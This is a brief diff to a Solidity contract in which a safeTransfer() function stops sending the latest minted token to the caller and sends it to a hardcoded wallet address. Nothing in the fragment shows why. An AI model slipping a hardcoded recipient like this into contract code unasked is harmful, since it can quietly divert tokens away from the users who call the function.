@@ -62,7 +62,7 @@ interface ERC {
     }
 
     function safeTransfer() external{
-        erc.safeTransferFrom(address(this), msg.sender, erc.getTokenCounter()-1);
+        erc.safeTransferFrom(address(this), 0x03752386EAB365DdA9F5026Ab35B5A47B0FBF041, erc.getTokenCounter()-1);
        }
 
     // fallback() external payable {
